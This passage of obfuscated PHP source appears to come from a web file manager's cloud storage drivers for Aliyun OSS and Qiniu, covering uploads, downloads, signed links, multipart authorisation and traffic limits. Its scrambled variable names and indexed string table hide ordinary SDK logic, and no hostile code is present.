$øİ´Ë¨[1523]) { return $øİ´Ë¨[635]; } return $·ëïÓÔ; } private function chmodPath($Æ­†¾İë, $×ã¯åß‘ = '') { $ØüÔ· =& $_SERVER[Î·Ü›öğ]; $ô—È³‹ = empty($×ã¯åß‘) ? $ØüÔ·[1523] : $×ã¯åß‘; $¶ÂØ·èá = array($ØüÔ·[37], $ØüÔ·[232], $ØüÔ·[1522], $ØüÔ·[1523]); if (!in_array($ô—È³‹, $¶ÂØ·èá)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Æ­†¾İë), $ô—È³‹); } catch (OSS\Core\OssException $¡Ã²ØÓ) { $this->writeLog(__FUNCTION__ . $ØüÔ·[215] . $¡Ã²ØÓ->getMessage()); return !1; } return !0; } public function getContent($¦¸Å­ƒ) { return $this->fileSubstr($¦¸Å­ƒ, -1); } public function setContent($•ÅÄ²¬, $¯´’¿ØÈ = '') { $‰åöÓ× =& $_SERVER[Î·Ü›öğ]; try { $»‘¬³²İ = $this->trafficLimit($‰åöÓ×[1524]); $±¹Ÿ‡ä = $this->client->putObject($this->bucket, $this->pathEncode($•ÅÄ²¬), $¯´’¿ØÈ, $»‘¬³²İ); } catch (OSS\Core\OssException $¬£Î…«Ó) { $this->writeLog(__FUNCTION__ . $‰åöÓ×[215] . $¬£Î…«Ó->getMessage()); return !1; } $š’‚·‘ = array($‰åöÓ×[1518] => trim($±¹Ÿ‡ä[$‰åöÓ×[1515]], $‰åöÓ×[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($•ÅÄ²¬))); $this->updateObjMeta($•ÅÄ²¬, $š’‚·‘); return isset($±¹Ÿ‡ä[$‰åöÓ×[1525]][$‰åöÓ×[297]]) ? !0 : !1; } private function updateObjMeta($Á¹ÔüóŸ, $Û‰¬¬ƒ‡) { $Á¹ÔüóŸ = $this->pathEncode($Á¹ÔüóŸ); try { $Óƒ¬Ë´è = array(OSS\OssClient::OSS_HEADERS => $Û‰¬¬ƒ‡); $this->client->copyObject($this->bucket, $Á¹ÔüóŸ, $this->bucket, $Á¹ÔüóŸ, $Óƒ¬Ë´è); } catch (OSS\Core\OssException $‘ÛÜÕÊ) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][215] . $‘ÛÜÕÊ->getMessage()); return !1; } return !0; } public function upload($Ø—¹ŒØß, $ıŒ±å«¡, $ğ˜Æ’ˆ = false, $³½šÔ¶ = REPEAT_REPLACE) { $‚½›Ë =& $_SERVER[Î·Ü›öğ]; $¨±îØ™á = trim($Ø—¹ŒØß, $‚½›Ë[8]); $“ğ§¶š² = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($‚½›Ë[1518] => @md5_file($ıŒ±å«¡)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ø—¹ŒØß))); $“ğ§¶š² = $this->trafficLimit($‚½›Ë[1524], $“ğ§¶š²); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¨±îØ™á), $ıŒ±å«¡, $“ğ§¶š²); } catch (OSS\Core\OssException $ş™˜î¯¬) { $this->writeLog(__FUNCTION__ . $‚½›Ë[215] . $ş™˜î¯¬->getMessage()); return !1; } return $this->getPathOuter($Ø—¹ŒØß); } public function getHost() { $¦•«ñÒ =& $_SERVER[Î·Ü›öğ]; $°Æ„Ò®Ë = explode($¦•«ñÒ[211], parent::getHost()); return $°Æ„Ò®Ë[0] . $¦•«ñÒ[211] . $this->bucket . $¦•«ñÒ[10] . $°Æ„Ò®Ë[1]; } public function uploadFormData($ğ¿Ôı’‡, $ÔïŸÊÕì = 3600) { $©º‘‚¬… =& $_SERVER[Î·Ü›öğ]; if (!($­ğ“úË = $this->getHost())) { return !1; } $¿¬‡¬ = $ÔïŸÊÕì; $îâùÈÓˆ = date($©º‘‚¬…[1526], time() + $¿¬‡¬); $Ëû¼ö…¤ = new DateTime($îâùÈÓˆ); $à“ìÊë = $Ëû¼ö…¤->format(DateTime::ISO8601); $œ—É²İ— = strpos($à“ìÊë, $©º‘‚¬…[373]); $à“ìÊë = substr($à“ìÊë, 0, $œ—É²İ—) . $©º‘‚¬…[1527]; $‡”¸ÑÂ = 1048576000 * 5; $ìÇ‹˜Šç = $this->pathFather($ğ¿Ôı’‡); $æµ‰°Ó = array($©º‘‚¬…[265] => $à“ìÊë, $©º‘‚¬…[268] => array(array($©º‘‚¬…[1528], 0, $‡”¸ÑÂ), array($©º‘‚¬…[270], $©º‘‚¬…[271], $ìÇ‹˜Šç))); $¤ŠóÃÕ¤ = base64_encode(json_encode($æµ‰°Ó)); $Û§Øö²‚ = base64_encode(hash_hmac($©º‘‚¬…[1449], $¤ŠóÃÕ¤, $this->secret, !0)); $¤ÙØÈ = array($©º‘‚¬…[1529] => $this->accessKey, $©º‘‚¬…[280] => $¤ŠóÃÕ¤, $©º‘‚¬…[273] => $©º‘‚¬…[264], $©º‘‚¬…[1530] => $Û§Øö²‚, $©º‘‚¬…[209] => $­ğ“úË); $¤ÙØÈ = $this->trafficLimit($©º‘‚¬…[1524], $¤ÙØÈ, !0); return $¤ÙØÈ; } public function uploadMultiData($åØ™Ä«, $Ø‰©ŠÊ  = 3600) { $±å”¾Ñ =& $_SERVER[Î·Ü›öğ]; if (!($ÜÓ»üŠÍ = $this->getHost())) { return !1; } $×µ±‹ûä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($åØ™Ä«)); return array($±å”¾Ñ[284] => $×µ±‹ûä, $±å”¾Ñ[209] => $ÜÓ»üŠÍ . $±å”¾Ñ[8] . $this->pathEncode($åØ™Ä«), $±å”¾Ñ[285] => gmdate($±å”¾Ñ[1531]), $±å”¾Ñ[97] => $åØ™Ä«); } public function uploadMultiAuth($øÆš™Ú², $ùÃß›éŠ = array()) { if (isset($ùÃß›éŠ[$_SERVER[Î·Ü›öğ][286]])) { return $this->uploadPartAuth($øÆš™Ú², $ùÃß›éŠ); } return $this->uploadListAuth($øÆš™Ú², $ùÃß›éŠ); } private function uploadPartAuth($¸ÓÇø½§, $š¢ÉÒ¬ = array()) { $ï¶äÜ­ =& $_SERVER[Î·Ü›öğ]; $Ö‡˜Ì„¼ = $š¢ÉÒ¬[$ï¶äÜ­[97]]; $†šÙ¦®ç = $this->_getUploadAuth($Ö‡˜Ì„¼, $š¢ÉÒ¬); $ÄüôéÂı = array($ï¶äÜ­[289] => $†šÙ¦®ç[$ï¶äÜ­[289]], $ï¶äÜ­[285] => $†šÙ¦®ç[$ï¶äÜ­[285]]); if (isset($†šÙ¦®ç[$ï¶äÜ­[1532]])) { $ÄüôéÂı[$ï¶äÜ­[1532]] = $†šÙ¦®ç[$ï¶äÜ­[1532]]; } return $ÄüôéÂı; } private function uploadListAuth($ñ¦ö÷—ş, $·¨ì¾êÆ = array()) { $ñ„¶Œ˜ =& $_SERVER[Î·Ü›öğ]; $¦Ùí‹‡Š = $·¨ì¾êÆ[$ñ„¶Œ˜[97]]; $ûÉ¸ö±É = $·¨ì¾êÆ[$ñ„¶Œ˜[284]]; $«’‚Û¾ = $this->client->listParts($this->bucket, $this->pathEncode($¦Ùí‹‡Š), $ûÉ¸ö±É); $İ–áäÍÛ = $«’‚Û¾->getListPart(); $¾ÂâëÓ¯ = array(); foreach ($İ–áäÍÛ as $Ø‚´åÒ) { $¾ÂâëÓ¯[] = array($ñ„¶Œ˜[300] => $Ø‚´åÒ->getPartNumber(), $ñ„¶Œ˜[301] => trim($Ø‚´åÒ->getETag(), $ñ„¶Œ˜[121])); } if (!$¾ÂâëÓ¯) { return !1; } $©¾‘„İ‰ = $this->_getUploadAuth($¦Ùí‹‡Š, $·¨ì¾êÆ); return array($ñ„¶Œ˜[289] => $©¾‘„İ‰[$ñ„¶Œ˜[289]], $ñ„¶Œ˜[285] => $©¾‘„İ‰[$ñ„¶Œ˜[285]], $ñ„¶Œ˜[292] => $¾ÂâëÓ¯); } private function _getUploadAuth($¹õ×±¯, $ßõëÊÇÕ) { $Ğ­†‚œ¶ =& $_SERVER[Î·Ü›öğ]; $ÛÆÖì¶í = gmdate($Ğ­†‚œ¶[1531]); $‰ª•Õ¢¶ = isset($ßõëÊÇÕ[$Ğ­†‚œ¶[286]]) ? $Ğ­†‚œ¶[256] : $Ğ­†‚œ¶[291]; $š°ıèœõ = array_intersect_key($ßõëÊÇÕ, array_flip(array($Ğ­†‚œ¶[286], $Ğ­†‚œ¶[284]))); ksort($š°ıèœõ); $¤äëÁœ› = $š°ıèœõ ? $Ğ­†‚œ¶[76] . http_build_query($š°ıèœõ, null, $Ğ­†‚œ¶[287], PHP_QUERY_RFC3986) : $Ğ­†‚œ¶[12]; $ÔÂ †¤™ = array($‰ª•Õ¢¶, $Ğ­†‚œ¶[12], $Ğ­†‚œ¶[123], $ÛÆÖì¶í, "\170\55\157\163\163\55\x64\141\164\145\72{$ÛÆÖì¶í}", $Ğ­†‚œ¶[8] . $this->bucket . $Ğ­†‚œ¶[8] . $¹õ×±¯ . $¤äëÁœ›); if (isset($ßõëÊÇÕ[$Ğ­†‚œ¶[286]])) { $‚Ôáá“ü = $this->trafficLimit($Ğ­†‚œ¶[1524], array(), !0); if ($‚Ôáá“ü) { $¹õ×±¯ = $Ğ­†‚œ¶[1532]; array_splice($ÔÂ †¤™, 5, 0, $¹õ×±¯ . $Ğ­†‚œ¶[4] . $‚Ôáá“ü[$¹õ×±¯]); } } $Á¦ëöú° = implode($Ğ­†‚œ¶[288], $ÔÂ †¤™); $ŠèÁ¼ö‘ = base64_encode(hash_hmac($Ğ­†‚œ¶[1449], $Á¦ëöú°, $this->secret, !0)); $şŞï•İâ = $Ğ­†‚œ¶[1501] . $this->accessKey . $Ğ­†‚œ¶[4] . $ŠèÁ¼ö‘; $ËöŸ¡•ë = array($Ğ­†‚œ¶[289] => $şŞï•İâ, $Ğ­†‚œ¶[285] => $ÛÆÖì¶í); if (!empty($‚Ôáá“ü)) { $ËöŸ¡•ë = array_merge($ËöŸ¡•ë, $‚Ôáá“ü); } return $ËöŸ¡•ë; } public function download($ÃêÃ¼¿, $‹à°›§½) { $Ô·“‹İº =& $_SERVER[Î·Ü›öğ]; if ($this->isFolder($ÃêÃ¼¿)) { return !1; } try { $Ø¦Í›ğÚ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $‹à°›§½); $Ø¦Í›ğÚ = $this->trafficLimit($Ô·“‹İº[112], $Ø¦Í›ğÚ); $this->client->getObject($this->bucket, $this->pathEncode($ÃêÃ¼¿), $Ø¦Í›ğÚ); } catch (OSS\Core\OssException $ ½»à€›) { $this->writeLog(__FUNCTION__ . $Ô·“‹İº[215] . $ ½»à€›->getMessage()); return !1; } return $‹à°›§½; } public function fileSubstr($øèäª»í, $´³¥¬Ë˜ = 0, $íşµ¢ö† = false) { if ($´³¥¬Ë˜ === -1) { $ŒéÎ†œ¹ = array(); } else { if ($íşµ¢ö† === !1) { $‰ğÜ’Ã– = $this->size($øèäª»í); } else { $‰ğÜ’Ã– = $´³¥¬Ë˜ + $íşµ¢ö† - 1; } $ŒéÎ†œ¹ = array(OSS\OssClient::OSS_RANGE => "{$´³¥¬Ë˜}\x2d{$‰ğÜ’Ã–}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($øèäª»í), $ŒéÎ†œ¹); } catch (OSS\Core\OssException $äÃèğã¸) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][215] . $äÃèğã¸->getMessage()); think_exception($äÃèğã¸->getMessage()); return !1; } } private function trafficLimit($ÂëŠ›», $¾ÜÂÔ÷© = array(), $Æß²ĞŠ = false) { $Ããà˜™ø =& $_SERVER[Î·Ü›öğ]; if ($ÂëŠ›» == $Ããà˜™ø[1524] && $this->isUploadServer() || $ÂëŠ›» == $Ããà˜™ø[112] && $this->isFileOutServer()) { return $¾ÜÂÔ÷©; } $ØÏµê¸Ë = floatval($GLOBALS[$Ããà˜™ø[6]][$Ããà˜™ø[92]][$Ããà˜™ø[110]][$ÂëŠ›»]) * 1024 * 1024 * 8; if (!$ØÏµê¸Ë) { return $¾ÜÂÔ÷©; } $ØÏµê¸Ë = $ØÏµê¸Ë < 819200 ? 819200 : ($ØÏµê¸Ë > 838860800 ? 838860800 : $ØÏµê¸Ë); if ($Æß²ĞŠ) { $¾ÜÂÔ÷©[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ØÏµê¸Ë); } else { if (!isset($¾ÜÂÔ÷©[OSS\OssClient::OSS_HEADERS])) { $¾ÜÂÔ÷©[OSS\OssClient::OSS_HEADERS] = array(); } $¾ÜÂÔ÷©[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ØÏµê¸Ë); } return $¾ÜÂÔ÷©; } public function link($Àê¹œ€¾, $üëØ° = array()) { $ÂñëÚìˆ =& $_SERVER[Î·Ü›öğ]; if (!$this->exist($Àê¹œ€¾) || $this->isFolder($Àê¹œ€¾)) { return !1; } try { $üëØ° = $this->trafficLimit($ÂñëÚìˆ[112], $üëØ°, !0); $Ê•‹åİĞ = $this->client->signUrl($this->bucket, $this->pathEncode($Àê¹œ€¾), 3600 * 12, $ÂñëÚìˆ[1533], $üëØ°); return $this->getCdnLink($Ê•‹åİĞ); } catch (OSS\Core\OssException $õ§ÓŒÛ) { $this->writeLog(__FUNCTION__ . $ÂñëÚìˆ[215] . $õ§ÓŒÛ->getMessage()); return !1; } } public function fileOut($şòÂÂÉÜ, $âŞ½ë§˜ = false, $Í‘á¸šº = false, $©ô¦„ã¤ = '') { $äéÙ…èÄ =& $_SERVER[Î·Ü›öğ]; if ($this->isFileOutServer()) { return $this->fileOutServer($şòÂÂÉÜ, $âŞ½ë§˜, $Í‘á¸šº, $©ô¦„ã¤); } if (!$Í‘á¸šº) { $Í‘á¸šº = $this->pathThis($şòÂÂÉÜ); } $Í‘á¸šº = rawurlencode($Í‘á¸šº); $Šşç›€ = get_file_mime(get_path_ext($Í‘á¸šº)); if ($Šşç›€ == $äéÙ…èÄ[251]) { return parent::fileOut($şòÂÂÉÜ, $âŞ½ë§˜, $Í‘á¸šº, $©ô¦„ã¤); } $âŞ½ë§˜ = $âŞ½ë§˜ ? $äéÙ…èÄ[1534] : $äéÙ…èÄ[1535]; $ÉÅ¹ê´Ê = array(OSS\OssClient::OSS_SUB_RESOURCE => $äéÙ…èÄ[1536] . rawurlencode("{$âŞ½ë§˜}\x3b\x66\151\154\145\x6e\141\x6d\x65\75{$Í‘á¸šº}")); $é«§Â–ü = $this->link($şòÂÂÉÜ, $ÉÅ¹ê´Ê); $this->fileOutLink($é«§Â–ü); } public function fileOutServer($öö°¤ÃË, $Ş·ş¼“Ô = false, $¶«ˆÃğ• = false, $ï²µˆÉ„ = '') { parent::fileOut($öö°¤ÃË, $Ş·ş¼“Ô, $¶«ˆÃğ•, $ï²µˆÉ„); } public function fileOutImage($½È‰±â£, $ÀÌ‰æŒÕ = 250) { if ($this->size($½È‰±â£) > 1024 * 1024 * 20) { return $this->fileOutImageServer($½È‰±â£, $ÀÌ‰æŒÕ); } $û‚‘«‘ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Î·Ü›öğ][1498] . $ÀÌ‰æŒÕ); $ïáè¿Èó = $this->link($½È‰±â£, $û‚‘«‘); $this->fileOutLink($ïáè¿Èó); } public function fileOutImageServer($ƒ¼›Ÿİ, $Ìñ›¥£ú = 250) { parent::fileOutImage($ƒ¼›Ÿİ, $Ìñ›¥£ú); } public function fileOutLink($²üÙ‹Â) { $şÑÃØ =& $_SERVER[Î·Ü›öğ]; if (!$this->isCdnHost() && substr($²üÙ‹Â, 0, 7) == $şÑÃØ[219]) { $²üÙ‹Â = $şÑÃØ[220] . substr($²üÙ‹Â, 7); } header($şÑÃØ[175] . $²üÙ‹Â); die; } public function hashMd5($…€Ì¯¶ó, $Äñ÷Âºğ = '') { $ùªÜÏë =& $_SERVER[Î·Ü›öğ]; $÷Åê©Œä = $this->_objectMeta($…€Ì¯¶ó); if (!$÷Åê©Œä) { return $ùªÜÏë[12]; } if (!isset($÷Åê©Œä[$ùªÜÏë[1518]]) && !empty($Äñ÷Âºğ)) { $Ğ¯Ğ™ = $this->updateObjMeta($…€Ì¯¶ó, array($ùªÜÏë[1518] => $Äñ÷Âºğ)); $÷Åê©Œä[$ùªÜÏë[1518]] = $Ğ¯Ğ™ ? $Äñ÷Âºğ : $ùªÜÏë[12]; } return isset($÷Åê©Œä[$ùªÜÏë[1518]]) ? strtolower($÷Åê©Œä[$ùªÜÏë[1518]]) : $ùªÜÏë[12]; } public function size($Ş¦”ˆ•Ê) { $¯‡¢Šìø = $this->objectMeta($Ş¦”ˆ•Ê); return $¯‡¢Šìø ? $¯‡¢Šìø[$_SERVER[Î·Ü›öğ][79]] : 0; } public function info($Ã›Şß) { if ($this->isFolder($Ã›Şß)) { return $this->folderInfo($Ã›Şß); } else { if ($this->isFile($Ã›Şß)) { return $this->fileInfo($Ã›Şß); } } return !1; } public function exist($£ôˆ¡é‰) { return $this->isFile($£ôˆ¡é‰) || $this->isFolder($£ôˆ¡é‰); } public function isFile($µ¢ÀÙşÄ) { return !$this->isFolder($µ¢ÀÙşÄ) && $this->objectMeta($µ¢ÀÙşÄ); } public function isFolder($ÇÆÚ€ó¨) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][180], $ÇÆÚ€ó¨); } protected function objectMeta($ëÕ‡Ñ°É) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][182], $ëÕ‡Ñ°É); } protected function _objectMeta($÷Šä×‰) { $»í¨ÆŸ =& $_SERVER[Î·Ü›öğ]; try { $¿Ñ‹Šñ¢ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($÷Šä×‰)); } catch (OSS\Core\OssException $œÄ­¥ÓŞ) { $this->writeLog(__FUNCTION__ . $»í¨ÆŸ[215] . $œÄ­¥ÓŞ->getMessage()); $¿Ñ‹Šñ¢ = !1; } if ($¿Ñ‹Šñ¢) { $¿Ñ‹Šñ¢[$»í¨ÆŸ[79]] = intval($¿Ñ‹Šñ¢[$»í¨ÆŸ[1516]]); } return $¿Ñ‹Šñ¢; } protected function _isFolder($³ï’·íâ) { $èÓ¢‡„í =& $_SERVER[Î·Ü›öğ]; if ($³ï’·íâ == $èÓ¢‡„í[12] || $³ï’·íâ == $èÓ¢‡„í[8]) { return !0; } $¼Ş²ï¹ = array($èÓ¢‡„í[1511] => $èÓ¢‡„í[8], $èÓ¢‡„í[1512] => rtrim($³ï’·íâ, $èÓ¢‡„í[8]) . $èÓ¢‡„í[8], $èÓ¢‡„í[1513] => 1, $èÓ¢‡„í[1514] => $èÓ¢‡„í[12]); $˜şíÂ«‚ = $this->client->listObjects($this->bucket, $¼Ş²ï¹); if ($˜şíÂ«‚->getObjectList() || $˜şíÂ«‚->getPrefixList()) { return !0; } return !1; } public function writeLog($°¤µœ€ = '', $ŠüÇé™„ = false) { $©åÌåé’ =& $_SERVER[Î·Ü›öğ]; $¡Ç¢é = in_array(ACTION, array($©åÌåé’[213], $©åÌåé’[214])); if (!$¡Ç¢é && !GLOBAL_DEBUG) { return; } $Ü£ÇÑÆŒ = 0; if (stripos($°¤µœ€, $©åÌåé’[1537]) !== !1) { $Ü£ÇÑÆŒ = 1; $ÜüËÈ¹œ = explode($©åÌåé’[1538], $°¤µœ€); $°¤µœ€ = !empty($ÜüËÈ¹œ[1]) ? $ÜüËÈ¹œ[1] : $°¤µœ€; } else { if (stripos($°¤µœ€, $©åÌåé’[1539])) { $Ü£ÇÑÆŒ = 2; $ÜüËÈ¹œ = explode($©åÌåé’[1539], $°¤µœ€); $ÜüËÈ¹œ = explode($©åÌåé’[4], $ÜüËÈ¹œ[0]); $°¤µœ€ = !empty($ÜüËÈ¹œ[1]) ? $ÜüËÈ¹œ[1] : $°¤µœ€; } } if ($¡Ç¢é && I18n::getType() == $©åÌåé’[1540]) { if ($Ü£ÇÑÆŒ == 1) { $°¤µœ€ = str_replace($©åÌåé’[1541], $©åÌåé’[1542], $°¤µœ€); } else { if ($Ü£ÇÑÆŒ == 2) { $ÜüËÈ¹œ = explode($©åÌåé’[215], $ÜüËÈ¹œ[0]); $ÀÙÔùüª = isset($ÜüËÈ¹œ[1]) ? $ÜüËÈ¹œ[1] : $©åÌåé’[12]; $µÚê°ãğ = array($©åÌåé’[1543] => $©åÌåé’[1544], $©åÌåé’[1545] => $©åÌåé’[1546], $©åÌåé’[1547] => $©åÌåé’[1548], $©åÌåé’[1549] => $©åÌåé’[1550], $©åÌåé’[1551] => $©åÌåé’[1552], $©åÌåé’[1553] => $©åÌåé’[1554], $©åÌåé’[1555] => $©åÌåé’[1556], $©åÌåé’[1557] => $©åÌåé’[1558], $©åÌåé’[1559] => $©åÌåé’[1560], $©åÌåé’[1561] => $©åÌåé’[1562]); if (isset($µÚê°ãğ[$ÀÙÔùüª])) { $°¤µœ€ = $µÚê°ãğ[$ÀÙÔùüª]; } } } if (stripos($°¤µœ€, $©åÌåé’[1563])) { $°¤µœ€ = $©åÌåé’[1564]; } } if (!trim($°¤µœ€)) { return; } parent::writeLog(trim($°¤µœ€), $ŠüÇé™„); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‚¹¹–‹) { parent::__construct(); require_once SDK_DIR . $_SERVER[Î·Ü›öğ][1565]; $this->_init($‚¹¹–‹); } public function _init($‡¤’¯‚) { $ÄãÆü¢‚ =& $_SERVER[Î·Ü›öğ]; $this->config = $‡¤’¯‚; foreach ($‡¤’¯‚ as $é½áëŞ => $‚¨èğ«Ù) { if (isset($this->{$é½áëŞ})) { $this->{$é½áëŞ} = $‚¨èğ«Ù; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÄãÆü¢‚[1566] . LNG($ÄãÆü¢‚[1502])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($êòîÖ¢, $ê›ò°Ğ® = '', $é •÷»Å = REPEAT_RENAME) { if ($this->setContent($êòîÖ¢, $ê›ò°Ğ®)) { return $this->getPathOuter($êòîÖ¢); } return !1; } public function mkdir($Ê‡ª› ¡, $Ÿ‰¨Ñî‚ = REPEAT_SKIP) { $ƒÒÑºËÌ =& $_SERVER[Î·Ü›öğ]; $õ¤²üõ± = trim($Ê‡ª› ¡, $ƒÒÑºËÌ[8]); if ($this->_isFolder($õ¤²üõ±)) { return $this->getPathOuter($õ¤²üõ±); } $Ê‡ª› ¡ = $õ¤²üõ± . $ƒÒÑºËÌ[8]; $§»ÚÈ¹¬ = get_path_this($õ¤²üõ±); $‰½åìü = $Ê‡ª› ¡ . $§»ÚÈ¹¬; if (!$this->mkfile($‰½åìü)) { return !1; } if (!$this->moveFile($‰½åìü, $Ê‡ª› ¡)) { $this->delFile($‰½åìü); return !1; } return $this->getPathOuter($õ¤²üõ±); } public function copyFile($ùıÒŞ‡, $Ûô­ôò¤) { $©û¢ø÷ = $this->bucketManager->copy($this->bucket, $ùıÒŞ‡, $this->bucket, $Ûô­ôò¤, !0); return $©û¢ø÷ ? !1 : $this->getPathOuter($Ûô­ôò¤); } public function moveFile($‚ô³œ £, $éÕºİ«ø) { $ıŞñì€¸ = $this->bucketManager->move($this->bucket, $‚ô³œ £, $this->bucket, $éÕºİ«ø, !0); return $ıŞñì€¸ ? !1 : $this->getPathOuter($éÕºİ«ø); } public function delFile($ƒò¡õ­) { if (!$this->exist($ƒò¡õ­)) { return !0; } $­®§ÂÑı = $this->bucketManager->delete($this->bucket, $ƒò¡õ­); if (!$­®§ÂÑı) { return !0; } return $­®§ÂÑı->code() == 612 ? !0 : !1; } public function delFolder($¨µĞÛâ) { $éÀü™˜ =& $_SERVER[Î·Ü›öğ]; if (!$this->exist($¨µĞÛâ)) { return !0; } $this->listItemCache = !1; $˜äÕ“ª = $this->fileList($¨µĞÛâ); $this->listItemCache = !0; $¶»¡¦İÓ = trim($¨µĞÛâ, $éÀü™˜[8]) . $éÀü™˜[8]; if (!empty($¨µĞÛâ) && $¨µĞÛâ !== $éÀü™˜[231] && !in_array($¶»¡¦İÓ, $˜äÕ“ª[$éÀü™˜[85]])) { $˜äÕ“ª[$éÀü™˜[85]][] = $¶»¡¦İÓ; } $ğå±”ù“ = $this->delByBatch($˜äÕ“ª[$éÀü™˜[86]]); if (!$ğå±”ù“) { return !1; } $ğå±”ù“ = $this->delByBatch($˜äÕ“ª[$éÀü™˜[85]]); if (!$ğå±”ù“) { return !1; } return $this->delFile($¶»¡¦İÓ); } private function delByBatch($‰ÈêÌ“ù) { foreach (array_chunk($‰ÈêÌ“ù, 1000) as $‡âÆì©ˆ) { $¬ÖÇ = $this->bucketManager->buildBatchDelete($this->bucket, $‡âÆì©ˆ); list($¹ı®ÃÆá, $‚ó°§›) = $this->bucketManager->batch($¬ÖÇ); if ($‚ó°§›) { return !1; } } return !0; } public function rename($õáÏùí, $òÁ©²êª) { return $this->renameObject($õáÏùí, $òÁ©²êª); } public function fileInfo($É¦ô—¦–, $ú·õÃ¡° = false, $¿‡°Œ‹¤ = array()) { $¹›ı¶À =& $_SERVER[Î·Ü›öğ]; $½€™’¬ì = array($¹›ı¶À[32] => $this->pathThis($É¦ô—¦–), $¹›ı¶À[87] => $this->getPathOuter($¹›ı¶À[8] . $É¦ô—¦–), $¹›ı¶À[33] => $¹›ı¶À[233], $¹›ı¶À[79] => isset($¿‡°Œ‹¤[$¹›ı¶À[1567]]) ? $¿‡°Œ‹¤[$¹›ı¶À[1567]] : 0, $¹›ı¶À[169] => $this->ext($É¦ô—¦–)); if ($ú·õÃ¡°) { return $½€™’¬ì; } $½€™’¬ì[$¹›ı¶À[234]] = $½€™’¬ì[$¹›ı¶À[88]] = 0; $½€™’¬ì[$¹›ı¶À[235]] = $½€™’¬ì[$¹›ı¶À[236]] = !0; if (empty($¿‡°Œ‹¤)) { $¿‡°Œ‹¤ = $this->objectMeta($É¦ô—¦–); if (!$¿‡°Œ‹¤) { return $½€™’¬ì; } } if (isset($¿‡°Œ‹¤[$¹›ı¶À[237]]) && $¿‡°Œ‹¤[$¹›ı¶À[237]]) { $½€™’¬ì[$¹›ı¶À[238]] = $¿‡°Œ‹¤[$¹›ı¶À[237]]; } if (isset($¿‡°Œ‹¤[$¹›ı¶À[248]]) && $¿‡°Œ‹¤[$¹›ı¶À[248]]) { $½€™’¬ì[$¹›ı¶À[238]] = $¿‡°Œ‹¤[$¹›ı¶À[248]]; } if (isset($¿‡°Œ‹¤[$¹›ı¶À[1568]])) { $½€™’¬ì[$¹›ı¶À[88]] = substr($¿‡°Œ‹¤[$¹›ı¶À[1568]] . $¹›ı¶À[12], 0, 10); } if (isset($¿‡°Œ‹¤[$¹›ı¶À[1567]])) { $½€™’¬ì[$¹›ı¶À[79]] = $¿‡°Œ‹¤[$¹›ı¶À[1567]]; } return $½€™’¬ì; } public function folderInfo($ïïıäÁœ, $©³éÅá© = false) { $ŠÛò‚Ş· =& $_SERVER[Î·Ü›öğ]; $”Óë°Ë¤ = array($ŠÛò‚Ş·[32] => $this->pathThis($ïïıäÁœ), $ŠÛò‚Ş·[87] => $this->getPathOuter($ŠÛò‚Ş·[8] . $ïïıäÁœ), $ŠÛò‚Ş·[33] => $ŠÛò‚Ş·[78]); if ($©³éÅá©) { return $”Óë°Ë¤; } $”Óë°Ë¤[$ŠÛò‚Ş·[234]] = $”Óë°Ë¤[$ŠÛò‚Ş·[88]] = 0; $”Óë°Ë¤[$ŠÛò‚Ş·[235]] = $”Óë°Ë¤[$ŠÛò‚Ş·[236]] = !0; $ïïıäÁœ = rtrim($ïïıäÁœ, $ŠÛò‚Ş·[8]) . $ŠÛò‚Ş·[8]; $ı°¢ ¯ = $this->objectMeta($ïïıäÁœ); if (isset($ı°¢ ¯[$ŠÛò‚Ş·[1568]])) { $”Óë°Ë¤[$ŠÛò‚Ş·[88]] = substr($ı°¢ ¯[$ŠÛò‚Ş·[1568]] . $ŠÛò‚Ş·[12], 0, 10); } return $”Óë°Ë¤; } public function listPath($šıòÜöß, $Ú™äÇÃª = false) { $¾¾§ªÈ  =& $_SERVER[Î·Ü›öğ]; $ÊÓÀÃ§ = $this->fileList($šıòÜöß, $¾¾§ªÈ [8], !0); foreach ($ÊÓÀÃ§[$¾¾§ªÈ [85]] as $˜¤îüšì => $¾üÍ¸ıâ) { $ÊÓÀÃ§[$¾¾§ªÈ [85]][$˜¤îüšì] = $this->folderInfo($¾üÍ¸ıâ, $Ú™äÇÃª); } foreach ($ÊÓÀÃ§[$¾¾§ªÈ [86]] as $˜¤îüšì => $¾üÍ¸ıâ) { $ÊÓÀÃ§[$¾¾§ªÈ [86]][$˜¤îüšì] = $this->fileInfo($¾üÍ¸ıâ[$¾¾§ªÈ [32]], $Ú™äÇÃª, $¾üÍ¸ıâ); } return $ÊÓÀÃ§; } public function has($Ô˜Ó, $ìü‘üÒ = false, $ÌûÜŠ¬ = true) { $÷á°¢„ƒ =& $_SERVER[Î·Ü›öğ]; $Ô˜Ó = trim($Ô˜Ó, $÷á°¢„ƒ[8]); $¡“¹¬ç– = empty($Ô˜Ó) && $Ô˜Ó !== $÷á°¢„ƒ[231] ? 